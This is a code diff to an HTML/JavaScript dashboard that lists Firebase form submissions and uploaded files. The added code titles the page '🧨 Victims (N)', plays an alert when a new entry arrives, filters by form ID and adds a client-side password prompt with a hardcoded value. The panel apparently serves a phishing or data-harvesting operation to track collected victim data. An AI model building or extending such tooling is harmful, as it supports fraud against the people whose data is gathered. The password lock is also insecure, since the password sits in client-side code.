@@ -112,6 +112,8 @@ button.delete { background:#f44336;color:#fff; }
   <button class="deleteAll" onclick="deleteSelected()">Delete Selected 🗑️</button>
   <button class="importAll" onclick="importAll()">Import All 📥</button>
 </div>
+<input id="filterInput" placeholder="Filter by Form ID..." 
+style="padding:8px;width:100%;margin-bottom:10px;">
 <div class="cards" id="cardsContainer"></div>
 </div>
 
@@ -125,8 +127,18 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
+// 🔐 SIMPLE LOCK
+const PASSWORD = "001234";
+
+const userPass = prompt("Enter dashboard password:");
+if(userPass !== PASSWORD){
+  document.body.innerHTML = "<h2>Access Denied</h2>";
+  throw new Error("Unauthorized");
+}
+
 let selected = new Set();
 let submissionsData = [];
+let allSubmissions = [];
 
 // Render submissions as cards
 function renderCards(submissions){
@@ -203,13 +215,15 @@ function renderCards(submissions){
     card.appendChild(btnDiv);
 
     if(file){
-  const link = document.createElement("a");
-  link.href = file;
-  link.target = "_blank";
-  link.textContent = "📎 View Uploaded File";
-  link.style.display = "block";
-  link.style.marginTop = "10px";
-  card.appendChild(link);
+  file.split(" | ").forEach(url => {
+    const link = document.createElement("a");
+    link.href = url;
+    link.target = "_blank";
+    link.textContent = "📎 View File";
+    link.style.display = "block";
+    link.style.marginTop = "6px";
+    card.appendChild(link);
+  });
 }
 
 container.appendChild(card);
@@ -221,14 +235,38 @@ container.appendChild(card);
 db.collection("submissions").orderBy("createdAt","desc").onSnapshot(snap=>{
   console.log("🔥 SNAPSHOT:", snap.size);
 
-  const submissions = [];
-  snap.forEach(doc=>{
-    console.log("DOC:", doc.data());
-    submissions.push(doc);
+  // ✅ ADD THIS
+  const titleEl = document.querySelector("h2");
+titleEl.textContent = `🧨 Victims (${snap.size})`;
+  
+  if (!window.initialLoadDone) {
+  window.initialLoadDone = true;
+} else {
+  if (snap.docChanges().some(c => c.type === "added")) {
+    new Audio("https://actions.google.com/sounds/v1/alarms/notification_simple-01.mp3").play();
+  }
+}
+
+  allSubmissions = [];
+snap.forEach(doc=>{
+  console.log("DOC:", doc.data());
+  allSubmissions.push(doc);
+});
+
+// ✅ FILTER SYSTEM
+applyFilter();
+});
+
+function applyFilter(){
+  const filter = document.getElementById("filterInput")?.value.toLowerCase() || "";
+
+  const filtered = allSubmissions.filter(doc => {
+    const formId = doc.data().formId || "";
+    return formId.toLowerCase().includes(filter);
   });
 
-  renderCards(submissions);
-});
+  renderCards(filtered);   // ✅ CORRECT
+}
 
 // Select all cards
 function selectAll(){
@@ -325,6 +363,8 @@ function importAll(){
   link.download = "submissions.csv";
   link.click();
 }
+
+document.getElementById("filterInput")?.addEventListener("input", applyFilter);
 </script>
 </body>
 </html>
